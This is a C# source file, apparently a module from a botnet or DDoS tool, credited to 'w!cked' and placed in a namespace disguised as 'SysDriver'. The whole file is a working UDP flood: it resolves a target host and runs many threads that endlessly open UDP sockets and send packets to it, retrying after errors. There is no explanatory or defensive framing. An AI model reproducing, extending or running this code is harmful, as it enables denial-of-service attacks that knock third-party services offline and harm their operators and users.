using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    internal class nUDPFlood
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        private static IPEndPoint IPEo;
        public static ushort uPort;
        public static int iPSize;
        private static UDPRequest[] UDPClass;
        public static int iThreads;
        public static int iUDPSockets;

        public static void StartUDPFlood()
        {
            try
            {
                IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
            }
            catch
            {
                IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            UDPClass = new UDPRequest[iThreads];

            for (int i = 0; i < iThreads; i++)
            {
                UDPClass[i] = new UDPRequest(IPEo, iUDPSockets, iPSize);
                tFloodingJob[i] = new ThreadStart(UDPClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
        }

        public static void StopUDPFlood()
        {
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Abort();
                    tFloodingThread[i].Join();
                }
                catch { }
            }
        }

        private class UDPRequest
        {
            private IPEndPoint IPEo;
            private int iPSize;
            private Socket[] pSocket;
            private int iUDPSockets;

            public UDPRequest(IPEndPoint tIPEo, int tUDPSockets, int tPSize)
            {
                this.IPEo = tIPEo;
                this.iUDPSockets = tUDPSockets;
                this.iPSize = tPSize;
            }

            public void Send()
            {
                int iNum;
                byte[] rBuffer;

            Label:
                rBuffer = new byte[this.iPSize];

                try
                {
                    this.pSocket = new Socket[this.iUDPSockets];

                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        this.pSocket[iNum] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        this.pSocket[iNum].Blocking = false;
                        this.pSocket[iNum].SendTo(rBuffer, this.IPEo);
                    }

                    Thread.Sleep(100);

                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                        this.pSocket[iNum].Close();
                        this.pSocket[iNum] = null;
                    }

                    this.pSocket = null;
                    goto Label;
                }
                catch
                {
                    for (iNum = 0; iNum < this.iUDPSockets; iNum++)
                    {
                        try
                        {
                            if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                            this.pSocket[iNum].Close();
                            this.pSocket[iNum] = null;
                        }
                        catch { }
                    }

                    goto Label;
                }
            }
        }
    }
}

